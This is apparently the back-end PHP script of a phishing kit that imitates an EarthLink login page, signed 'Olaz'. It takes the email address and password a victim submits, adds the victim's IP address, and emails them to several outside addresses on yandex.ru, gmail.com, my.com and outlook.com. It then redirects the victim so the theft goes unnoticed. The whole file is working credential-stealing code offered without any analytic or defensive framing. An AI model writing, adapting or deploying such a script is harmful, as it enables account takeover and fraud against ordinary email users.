<?php

include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

$message  = "------------------+ DON NEW EARTH LOGIN +-----------------\n";
$message .= "Email Address: ".$_POST['1']."\n";
$message .= "Password: ".$_POST['2']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-------------------+ Created in 2020 [ Olaz ] +--------------------\n";

$recipient = "banger.nine@yandex.ru, nine.banger@my.com,banger.nine@my.com.,ninebanger44@gmail.com, ninebnager67@gmail.com, ninebanger@outlook.com";
$subject = "Olaz EARTHLINK LOGIN RESULTZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."n";
$headers .= "Olaz-LOGIN";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: 3refd.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        